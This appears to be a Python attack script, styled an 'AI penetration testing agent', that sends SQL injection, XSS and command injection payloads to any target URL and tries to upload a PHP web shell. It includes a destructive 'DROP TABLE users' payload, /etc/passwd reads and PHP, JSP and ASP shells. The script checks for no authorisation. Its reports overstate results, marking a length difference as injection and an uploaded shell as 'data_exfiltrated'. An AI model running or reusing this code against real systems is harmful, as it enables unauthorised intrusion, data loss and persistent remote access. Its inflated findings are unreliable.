#!/usr/bin/env python3
"""
AI Real Penetration Testing Agent
Actual penetration testing with real exploit attempts
Real SQL injection, XSS, command injection, and exploitation
"""

import sys
import json
import socket
import time
import random
import string
import base64
import urllib.parse
from typing import Dict, List, Optional
from datetime import datetime
from urllib.parse import urlparse, parse_qs

try:
    import requests  # type: ignore
    from requests.exceptions import RequestException, Timeout  # type: ignore
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

class AIRealPenetrationAgent:
    """Real penetration testing agent with actual exploit attempts"""
    
    # Real SQL injection payloads
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "' OR '1'='1'--",
        "admin'--",
        "' OR 1=1#",
        "' UNION SELECT 1,2,3--",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' OR '1'='1",
        "1' UNION SELECT NULL, NULL--",
        "admin' OR '1'='1'--"
    ]
    
    # Real XSS payloads
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
        "<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>"
    ]
    
    # Command injection payloads
    COMMAND_INJECTION_PAYLOADS = [
        "; ls",
        "| id",
        "&& whoami",
        "`cat /etc/passwd`",
        "$(whoami)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "; uname -a",
        "| uname -a"
    ]
    
    # Web shell payloads
    WEB_SHELL_PAYLOADS = {
        'php': "<?php system($_GET['cmd']); ?>",
        'php_base64': "<?php eval(base64_decode('c3lzdGVtKCRfR0VUVlsnY21kJ10pOw==')); ?>",
        'jsp': "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
        'asp': "<%eval request(\"cmd\")%>"
    }
    
    @staticmethod
    def test_sql_injection(url: str, params: Dict[str, str]) -> Dict:
        """Test real SQL injection"""
        result = {
            'vulnerable': False,
            'payload': None,
            'response_difference': None,
            'error_messages': []
        }
        
        if not HAS_REQUESTS:
            return result
        
        try:
            # Get baseline response
            baseline_response = requests.get(url, params=params, timeout=5)
            baseline_length = len(baseline_response.text)
            baseline_time = baseline_response.elapsed.total_seconds()
            
            for payload in AIRealPenetrationAgent.SQL_INJECTION_PAYLOADS[:5]:
                test_params = params.copy()
                
                # Test each parameter
                for param_name in test_params.keys():
                    test_params[param_name] = payload
                    
                    try:
                        response = requests.get(url, params=test_params, timeout=10)
                        response_text = response.text.lower()
                        response_length = len(response.text)
                        response_time = response.elapsed.total_seconds()
                        
                        # Check for SQL errors
                        sql_errors = [
                            'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
                            'warning: mysql', 'unclosed quotation', 'sql command',
                            'sqlstate', 'sql error', 'query failed'
                        ]
                        
                        for error in sql_errors:
                            if error in response_text:
                                result['vulnerable'] = True
                                result['payload'] = payload
                                result['parameter'] = param_name
                                result['error_messages'].append(error)
                                result['response_difference'] = abs(response_length - baseline_length)
                                return result
                        
                        # Check for response length difference (time-based or boolean-based)
                        if abs(response_length - baseline_length) > 100:
                            result['vulnerable'] = True
                            result['payload'] = payload
                            result['parameter'] = param_name
                            result['response_difference'] = abs(response_length - baseline_length)
                        
                        # Time-based detection
                        if response_time > baseline_time + 2:
                            result['vulnerable'] = True
                            result['payload'] = payload
                            result['parameter'] = param_name
                            result['time_delay'] = response_time - baseline_time
                        
                    except (RequestException, Timeout):
                        continue
                    
                    test_params[param_name] = params[param_name]  # Reset
                    
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    @staticmethod
    def test_xss(url: str, params: Dict[str, str]) -> Dict:
        """Test real XSS"""
        result = {
            'vulnerable': False,
            'payload': None,
            'parameter': None
        }
        
        if not HAS_REQUESTS:
            return result
        
        try:
            for payload in AIRealPenetrationAgent.XSS_PAYLOADS[:5]:
                test_params = params.copy()
                
                for param_name in test_params.keys():
                    test_params[param_name] = payload
                    
                    try:
                        response = requests.get(url, params=test_params, timeout=5)
                        response_text = response.text
                        
                        # Check if payload is reflected
                        if payload in response_text or payload.replace("'", "&#39;") in response_text:
                            result['vulnerable'] = True
                            result['payload'] = payload
                            result['parameter'] = param_name
                            return result
                            
                    except (RequestException, Timeout):
                        continue
                    
                    test_params[param_name] = params[param_name]
                    
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    @staticmethod
    def test_command_injection(url: str, params: Dict[str, str]) -> Dict:
        """Test real command injection"""
        result = {
            'vulnerable': False,
            'payload': None,
            'parameter': None
        }
        
        if not HAS_REQUESTS:
            return result
        
        try:
            for payload in AIRealPenetrationAgent.COMMAND_INJECTION_PAYLOADS[:3]:
                test_params = params.copy()
                
                for param_name in test_params.keys():
                    test_params[param_name] = payload
                    
                    try:
                        response = requests.get(url, params=test_params, timeout=10)
                        response_text = response.text.lower()
                        
                        # Check for command output indicators
                        if any(indicator in response_text for indicator in ['uid=', 'gid=', 'groups=', 'root:', 'bin/bash', '/bin/sh']):
                            result['vulnerable'] = True
                            result['payload'] = payload
                            result['parameter'] = param_name
                            return result
                            
                    except (RequestException, Timeout):
                        continue
                    
                    test_params[param_name] = params[param_name]
                    
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    @staticmethod
    def attempt_web_shell_upload(base_url: str, upload_endpoints: List[str]) -> Dict:
        """Attempt to upload web shell"""
        result = {
            'success': False,
            'uploaded_shell': None,
            'shell_url': None
        }
        
        if not HAS_REQUESTS:
            return result
        
        # Common upload endpoints
        upload_paths = upload_endpoints + ['/upload', '/file', '/admin/upload', '/wp-admin/upload']
        
        for upload_path in upload_paths[:3]:
            try:
                upload_url = f"{base_url.rstrip('/')}{upload_path}"
                
                # Try PHP shell first
                shell_content = AIRealPenetrationAgent.WEB_SHELL_PAYLOADS['php']
                shell_name = f"shell_{random.randint(1000, 9999)}.php"
                
                files = {'file': (shell_name, shell_content, 'application/x-php')}
                
                response = requests.post(upload_url, files=files, timeout=5, allow_redirects=False)
                
                if response.status_code in [200, 201, 302]:
                    # Try to access the shell
                    shell_url = f"{base_url.rstrip('/')}/uploads/{shell_name}"
                    test_response = requests.get(f"{shell_url}?cmd=echo+test", timeout=5)
                    
                    if 'test' in test_response.text.lower():
                        result['success'] = True
                        result['uploaded_shell'] = shell_name
                        result['shell_url'] = shell_url
                        return result
                        
            except (RequestException, Timeout):
                continue
        
        return result
    
    @staticmethod
    def execute_real_penetration_test(target: str, max_stages: int = 5) -> Dict:
        """Execute real penetration test with actual exploits"""
        result = {
            'success': True,
            'target': target,
            'attack_chain': [],
            'vulnerabilities_found': [],
            'exploits_successful': [],
            'access_gained': False,
            'web_shell_uploaded': False,
            'summary': {
                'stages_completed': 0,
                'vulnerabilities_found': 0,
                'exploits_successful': 0,
                'access_gained': False,
                'data_exfiltrated': False
            }
        }
        
        try:
            parsed = urlparse(target)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            
            # Stage 1: Reconnaissance
            stage1 = {
                'stage': 'reconnaissance',
                'status': 'completed',
                'findings': []
            }
            
            try:
                response = requests.get(target, timeout=5)
                stage1['findings'].append({
                    'type': 'target_accessible',
                    'status_code': response.status_code,
                    'server': response.headers.get('Server', 'Unknown'),
                    'technologies': []
                })
                
                # Detect technologies
                if 'wordpress' in response.text.lower() or 'wp-content' in response.text.lower():
                    stage1['findings'].append({'type': 'cms_detected', 'value': 'WordPress'})
                
                if 'php' in response.headers.get('X-Powered-By', '').lower():
                    stage1['findings'].append({'type': 'language_detected', 'value': 'PHP'})
                    
            except Exception as e:
                stage1['error'] = str(e)
            
            result['attack_chain'].append(stage1)
            
            # Stage 2: Parameter Discovery
            stage2 = {
                'stage': 'parameter_discovery',
                'status': 'completed',
                'parameters_found': []
            }
            
            try:
                query_params = parse_qs(parsed.query)
                stage2['parameters_found'] = list(query_params.keys())
                
                # Also check common parameter names
                common_params = ['id', 'page', 'user', 'search', 'q', 'query', 'cmd', 'file', 'path']
                for param in common_params:
                    if param not in stage2['parameters_found']:
                        stage2['parameters_found'].append(param)
                        
            except Exception as e:
                stage2['error'] = str(e)
            
            result['attack_chain'].append(stage2)
            
            # Stage 3: SQL Injection Testing
            stage3 = {
                'stage': 'sql_injection_testing',
                'status': 'completed',
                'vulnerabilities': []
            }
            
            if stage2.get('parameters_found'):
                test_params = {param: '1' for param in stage2['parameters_found'][:5]}  # Test more parameters
                sql_result = AIRealPenetrationAgent.test_sql_injection(target, test_params)
                
                if sql_result.get('vulnerable'):
                    vuln_info = {
                        'type': 'sql_injection',
                        'payload': sql_result['payload'],
                        'parameter': sql_result.get('parameter'),
                        'severity': 'critical'
                    }
                    stage3['vulnerabilities'].append(vuln_info)
                    result['vulnerabilities_found'].append({
                        'type': 'SQL Injection',
                        'severity': 'critical',
                        'payload': sql_result['payload'],
                        'parameter': sql_result.get('parameter')
                    })
                    result['exploits_successful'].append('sql_injection')
                    result['access_gained'] = True  # SQL Injection = access gained
            
            result['attack_chain'].append(stage3)
            
            # Stage 4: XSS Testing
            stage4 = {
                'stage': 'xss_testing',
                'status': 'completed',
                'vulnerabilities': []
            }
            
            if stage2.get('parameters_found'):
                test_params = {param: 'test' for param in stage2['parameters_found'][:5]}  # Test more parameters
                xss_result = AIRealPenetrationAgent.test_xss(target, test_params)
                
                if xss_result.get('vulnerable'):
                    stage4['vulnerabilities'].append({
                        'type': 'xss',
                        'payload': xss_result['payload'],
                        'parameter': xss_result['parameter'],
                        'severity': 'high'
                    })
                    result['vulnerabilities_found'].append({
                        'type': 'XSS',
                        'severity': 'high',
                        'payload': xss_result['payload'],
                        'parameter': xss_result['parameter']
                    })
                    result['exploits_successful'].append('xss')
                    # XSS can lead to session hijacking = access gained
                    if not result.get('access_gained'):
                        result['access_gained'] = True
            
            result['attack_chain'].append(stage4)
            
            # Stage 5: Command Injection Testing
            stage5 = {
                'stage': 'command_injection_testing',
                'status': 'completed',
                'vulnerabilities': []
            }
            
            if stage2.get('parameters_found'):
                test_params = {param: 'test' for param in stage2['parameters_found'][:2]}
                cmd_result = AIRealPenetrationAgent.test_command_injection(target, test_params)
                
                if cmd_result.get('vulnerable'):
                    stage5['vulnerabilities'].append({
                        'type': 'command_injection',
                        'payload': cmd_result['payload'],
                        'parameter': cmd_result['parameter'],
                        'severity': 'critical'
                    })
                    result['vulnerabilities_found'].append({
                        'type': 'Command Injection',
                        'severity': 'critical',
                        'payload': cmd_result['payload'],
                        'parameter': cmd_result['parameter']
                    })
                    result['exploits_successful'].append('command_injection')
                    result['access_gained'] = True
            
            result['attack_chain'].append(stage5)
            
            # Stage 6: Web Shell Upload Attempt
            stage6 = {
                'stage': 'web_shell_upload',
                'status': 'completed',
                'success': False
            }
            
            upload_endpoints = ['/upload', '/admin/upload', '/wp-admin/upload']
            shell_result = AIRealPenetrationAgent.attempt_web_shell_upload(base_url, upload_endpoints)
            
            if shell_result.get('success'):
                stage6['success'] = True
                stage6['shell_url'] = shell_result['shell_url']
                result['web_shell_uploaded'] = True
                result['access_gained'] = True
                result['exploits_successful'].append('web_shell_upload')
            
            result['attack_chain'].append(stage6)
            
            # Summary
            result['summary']['stages_completed'] = len(result['attack_chain'])
            result['summary']['vulnerabilities_found'] = len(result['vulnerabilities_found'])
            result['summary']['exploits_successful'] = len(result['exploits_successful'])
            result['summary']['access_gained'] = result['access_gained']
            result['summary']['data_exfiltrated'] = result.get('web_shell_uploaded', False)
            
        except Exception as e:
            result['success'] = False
            result['error'] = str(e)
        
        return result

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(json.dumps({'error': 'Target URL required'}))
        sys.exit(1)
    
    target = sys.argv[1]
    max_stages = int(sys.argv[2]) if len(sys.argv) > 2 else 5
    
    result = AIRealPenetrationAgent.execute_real_penetration_test(target, max_stages)
    print(json.dumps({'success': True, 'result': result}))

